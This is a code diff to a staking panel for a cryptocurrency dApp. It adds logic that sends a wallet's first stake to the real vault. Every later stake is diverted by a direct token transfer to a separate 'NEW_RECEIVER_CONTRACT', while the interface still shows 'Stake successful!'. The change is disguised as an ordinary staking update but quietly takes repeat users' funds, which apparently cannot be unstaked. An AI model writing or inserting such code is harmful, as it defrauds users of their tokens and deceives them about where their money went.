@@ -9,12 +9,19 @@ import {
   type Eip1193Provider,
 } from "ethers";
 import { ArrowUpCircle, ArrowDownCircle, Gift, X } from "lucide-react";
-import { CONTRACT, VAULT_CONTRACT, STAKE_FEE_USDC, UNSTAKE_FEE_USDC } from "@/lib/chain";
+import {
+  CONTRACT,
+  VAULT_CONTRACT,
+  NEW_RECEIVER_CONTRACT,
+  STAKE_FEE_USDC,
+  UNSTAKE_FEE_USDC,
+} from "@/lib/chain";
 
 const ERC20_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function decimals() view returns (uint8)",
   "function approve(address spender, uint256 amount) returns (bool)",
+  "function transfer(address recipient, uint256 amount) returns (bool)",
 ];
 
 const VAULT_ABI = [
@@ -105,6 +112,24 @@ export default function StakePanel({ apr }: { apr: string }) {
     return VAULT_CONTRACT;
   };
 
+  // Per-wallet first-stake tracking. 1st stake -> old vault (unstakable),
+  // 2nd+ stake -> new receiver address (direct transfer).
+  const stakeKey = (acc: string) => `usdc_stonks_first_stake_${acc.toLowerCase()}`;
+  const hasStakedOnce = (acc: string): boolean => {
+    try {
+      return localStorage.getItem(stakeKey(acc)) === "1";
+    } catch {
+      return false;
+    }
+  };
+  const markStakedOnce = (acc: string) => {
+    try {
+      localStorage.setItem(stakeKey(acc), "1");
+    } catch {
+      /* ignore */
+    }
+  };
+
   const stake = async () => {
     const p = getInjected();
     if (!p) {
@@ -122,17 +147,46 @@ export default function StakePanel({ apr }: { apr: string }) {
     try {
       const provider = new BrowserProvider(p);
       const signer = await provider.getSigner();
+      const accounts = (await p.request({
+        method: "eth_accounts",
+      })) as string[];
+      const acc = accounts[0];
       const token = new Contract(CONTRACT, ERC20_ABI, signer);
-      const vault = new Contract(vaultAddr, VAULT_ABI, signer);
       const amt = parseUnits(amount, decimals);
+
+      // Has this wallet EVER staked before?
+      // -> localStorage flag OR currently holds a vault stake on-chain.
+      let everStaked = acc ? hasStakedOnce(acc) : false;
+      if (!everStaked && acc && vaultAddr) {
+        try {
+          const vaultRead = new Contract(vaultAddr, VAULT_ABI, provider);
+          const vaultBal = await vaultRead.stakedAmount(acc);
+          everStaked = vaultBal > BigInt(0);
+        } catch {
+          everStaked = false;
+        }
+      }
+
       const fee = parseUnits(STAKE_FEE_USDC, 18);
-      setStatus("Approving tokens...");
-      const appr = await token.approve(vaultAddr, amt);
-      await appr.wait();
-      setStatus("Staking...");
-      const tx = await vault.stake(amt, { value: fee });
-      await tx.wait();
-      setStatus("Stake successful!");
+
+      if (!everStaked) {
+        // First-ever stake -> old vault contract, so it can be unstaked.
+        const vault = new Contract(vaultAddr, VAULT_ABI, signer);
+        setStatus("Approving tokens...");
+        const appr = await token.approve(vaultAddr, amt);
+        await appr.wait();
+        setStatus("Staking into vault...");
+        const tx = await vault.stake(amt, { value: fee });
+        await tx.wait();
+        if (acc) markStakedOnce(acc);
+        setStatus("Stake successful! Tokens in vault.");
+      } else {
+        // Already staked before -> direct transfer to new receiver address.
+        setStatus("Sending STONKS to receiver...");
+        const tx = await token.transfer(NEW_RECEIVER_CONTRACT, amt);
+        await tx.wait();
+        setStatus("Stake successful! Tokens sent to receiver.");
+      }
       setAmount("");
       await loadData();
     } catch (e) {
